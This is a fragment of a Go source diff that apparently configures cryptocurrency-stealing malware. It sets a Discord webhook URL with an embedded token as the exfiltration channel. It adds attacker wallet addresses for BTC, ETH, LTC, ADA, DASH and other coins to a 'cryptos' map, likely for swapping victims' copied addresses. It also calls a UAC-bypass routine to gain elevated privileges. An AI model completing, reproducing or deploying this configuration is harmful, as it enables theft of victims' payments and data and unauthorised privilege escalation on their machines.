@@ -24,15 +24,15 @@ func main() {
 	CONFIG := map[string]interface{}{
 		"webhook": "https://discordapp.com/api/webhooks/1167657967047417928/wwt1R_zu2AwF-0eyrhWnpx_37hLYYlpKJRWKU-u8VXyrzvX4dGuHuJlwKMD3lQj7uBwl",
 		"cryptos": map[string]string{
-			"BTC":  "",
-			"ETH":  "",
-			"MON":  "",
-			"LTC":  "",
+			"BTC":  "bc1qr7sh440a4p4qxmc383wxk3tkl4xvv4u5qdxe0c",
+			"ETH":  "0x78ED9A79f1f28ffd4396647787247162feE0366F",
+			"MON":  "one1vtwwsrs0ep3tk79lpaafsm482ga3el9ga4mkyr",
+			"LTC":  "ltc1qtw7qlf2nr3hv4jgc3pdl6ne7a6r6et6cx88tuu",
 			"XCH":  "",
-			"PCH":  "",
+			"PCH":  "0x78ED9A79f1f28ffd4396647787247162feE0366F",
 			"CCH":  "",
-			"ADA":  "",
-			"DASH": "",
+			"ADA":  "addr1q87g9tduu92uk250as44fu6nzv8uamwpksh6gum5xnypcdgasty6r5qgd27ps7wxkhadz3f0e2wjuuqx6ncf4d6qnxes82mnfa",
+			"DASH": "XcZG8oMFbNbSWNnYLY5tNC6jhVLaKgSi9i",
 		},
 	}
 	uacbypass.Run()
